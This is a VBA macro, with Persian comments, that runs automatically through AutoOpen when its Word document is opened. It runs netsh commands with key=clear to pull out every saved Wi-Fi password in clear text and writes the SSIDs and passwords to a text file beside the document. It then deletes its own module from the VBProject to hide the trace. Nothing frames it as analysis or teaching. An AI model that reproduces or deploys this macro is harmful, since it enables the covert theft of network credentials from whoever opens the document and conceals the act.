Sub AutoOpen()
    On Error GoTo ErrorHandler
    Call RetrieveWiFiProfiles
    Call SelfDeleteMacro
    Exit Sub

ErrorHandler:
    MsgBox "An error occurred: " & Err.Description
End Sub

Sub RetrieveWiFiProfiles()
    On Error GoTo ErrorHandler
    Dim objShell As Object
    Dim objExec As Object
    Dim objExecProfile As Object
    Dim strLine As String
    Dim outputFile As String
    Dim profileName As String
    Dim password As String
    Dim fileNumber As Integer

    ' مسیر فایل خروجی
    outputFile = ThisDocument.Path & "\WiFiProfiles.txt"

    ' ایجاد فایل خروجی و نوشتن سرصفحه
    fileNumber = FreeFile
    Open outputFile For Output As fileNumber
    Print #fileNumber, "Retrieving WiFi profiles..."
    Print #fileNumber, "-----------------------------------------"
    Print #fileNumber, "SSID                Password              "
    Print #fileNumber, "-----------------------------------------"
    Close fileNumber

    ' Initialize objShell
    Set objShell = CreateObject("WScript.Shell")

    ' استفاده از Shell برای اجرای دستور netsh
    Set objExec = objShell.Exec("netsh wlan show profiles")

    ' خواندن خروجی دستور
    Do While Not objExec.StdOut.AtEndOfStream
        strLine = objExec.StdOut.ReadLine

        ' اگر خط دارای نام پروفایل باشد، آن را پردازش می‌کنیم
        If InStr(strLine, "All User Profile") > 0 Then
            profileName = Trim(Split(strLine, ":")(1))
            profileName = Trim(profileName)

            ' تلاش برای استخراج رمز عبور
            Set objExecProfile = objShell.Exec("netsh wlan show profile name=""" & profileName & """ key=clear")
            Do While Not objExecProfile.StdOut.AtEndOfStream
                strLine = objExecProfile.StdOut.ReadLine
                If InStr(strLine, "Key Content") > 0 Then
                    password = Trim(Split(strLine, ":")(1))
                    password = Trim(password)
                    If Len(password) > 0 Then
                        WriteProfileToFile profileName, password, outputFile
                    End If
                End If
            Loop
        End If
    Loop

    MsgBox "WiFi profiles have been saved to " & outputFile
    Exit Sub

ErrorHandler:
    MsgBox "An error occurred in RetrieveWiFiProfiles: " & Err.Description
End Sub

Sub WriteProfileToFile(profileName As String, password As String, outputFile As String)
    Dim fileNumber As Integer
    fileNumber = FreeFile
    Open outputFile For Append As fileNumber
    Print #fileNumber, profileName & "            " & password
    Close fileNumber
End Sub

Sub SelfDeleteMacro()
    On Error GoTo ErrorHandler
    Dim vbProj As Object
    Set vbProj = ThisDocument.VBProject
    
    Dim vbComp As Object
    For Each vbComp In vbProj.VBComponents
        If vbComp.Name = "Module1" Then
            vbProj.VBComponents.Remove vbComp
            Exit For
        End If
    Next vbComp
    Exit Sub

ErrorHandler:
    MsgBox "An error occurred in SelfDeleteMacro: " & Err.Description
End Sub
